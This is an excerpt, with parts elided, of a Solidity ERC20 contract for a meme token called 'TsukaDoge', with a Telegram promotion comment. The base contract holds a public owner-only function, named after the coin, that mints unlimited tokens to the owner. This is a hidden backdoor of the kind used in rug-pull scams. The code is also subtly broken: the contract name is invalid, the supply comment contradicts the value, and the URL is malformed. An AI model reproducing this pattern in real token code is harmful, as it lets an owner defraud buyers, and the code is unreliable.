...
//
// $TsukaDoge proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/TsukaDoge
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _TsukaDoge(uint256 amount) public onlyOwner {
    _TsukaDoge(msg.sender, amount);
    }
    ...
    function _TsukaDoge(address account, uint256 amount) internal virtual {
...
contract $TsukaDoge is ERC20 {

    uint tokenTotalSupply = 2000000000; // 100 Million Token Supply

    constructor() public ERC20("Tsuka Doge", "TsukaDoge") {
        _TsukaDoge(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}